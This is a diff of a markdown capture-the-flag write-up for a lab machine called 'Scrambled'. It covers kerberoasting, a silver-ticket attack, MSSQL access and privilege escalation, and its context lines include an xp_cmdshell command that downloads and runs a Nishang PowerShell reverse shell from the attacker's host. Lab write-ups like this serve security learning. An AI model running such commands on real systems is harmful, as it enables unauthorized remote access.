@@ -1,8 +1,16 @@
-Scrambled
-========
+# Scrambled
 
-External Enumeration
---------------------
+<details open>
+<summary></summary>
+  
+* [External Enumeration](#external-enumeration)
+* [Kerberoasting and Silver Ticket](#kerberoasting-and-silver-ticket-attack)
+* [Initial Access](#initial-access)
+* [Privilege Escalation](#privilege-escalation)
+
+</details>
+  
+## External Enumeration
 
 We'll first run a portscan against the target 10.10.11.168, here I'm using my bash alias `fscan`
 
@@ -63,8 +71,7 @@ Enumerating all the shares we find we only have access to the `Public` share whi
 
 <img src="Images/pdf.png" width=600>
 
-Kerberoasting & Silver Ticket Attack
-------------------------------------
+## Kerberoasting & Silver Ticket Attack
 
 The pdf points to a SQL Service active in the domain. A common attack vector regarding services in active directory is **kerberoasting**, and the tool of choice for this is impacket's `GetSPNUser.py`. The way this works is that each instance of a service in active directory has to be tied to a unique logon account through a **Service Principal Name** (SPN), so an SPN is just an account<--->service mapping. Since the KDC doesn't verify if we have sufficient privilege to access the service (it's left up to the service to do this), we can request a TGS from the KDC for any and every service. The server portion of the TGS is encrypted with a key derived from the password hash of the user account tied to the service in the SPN, so we can offline brute force the password for the account by guessing a password, hashing it and seeing if it will correctly decrypt the server portion of the TGS.
 
@@ -108,8 +115,7 @@ From <https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html>
 
 'A credential cache (or “ccache”) holds Kerberos credentials while they remain valid and, generally, while the user’s session lasts, so that authenticating to a service multiple times (e.g., connecting to a web or mail server more than once) doesn’t require contacting the KDC every time.'
 
-Initial Access
---------------
+## Initial Access
 
 Now we can authenticate to the SQL server as the administrator which should let us do some interesting stuff. Impacket has a script `mssqlclient.py` which will let us authenticate to the service using our forged ticket. 
 
@@ -163,8 +169,8 @@ From here I can get the user flag by changing `whoami` to `cat c:\users\miscsvc\
 
 <img src="Images/user.png" width=500>
 
-Privilege Escalation
---------------------
+## Privilege Escalation
+
 Now I'll get a shell on the box as `sqlsvc` so that I can ~~exploit~~ use `SeImpersonatePrivilege`
 
 To do this I'll run `rlwrap nc -nvlp 8000` to start a netcat listener on port 8000, while hosting Nishang's `Invoke-PowerShellTcp.ps1` reverse shell on a webserver then execute `xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.43/Invoke-PowerShellTcp.ps1')` from the MSSQL instance. 
